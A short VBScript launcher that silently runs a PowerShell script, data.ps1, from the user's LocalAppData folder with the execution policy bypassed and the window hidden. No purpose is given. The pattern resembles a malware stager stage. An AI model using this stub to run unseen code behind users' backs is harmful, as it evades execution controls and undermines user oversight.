Set objShell = CreateObject("WScript.Shell")
localPath = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
scriptPath = localPath & "\data.ps1"

Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(scriptPath) Then
   
    command = "powershell -ExecutionPolicy Bypass -File """ & scriptPath & """"
    objShell.Run command, 0, True
Else
    MsgBox "er " & scriptPath
End If
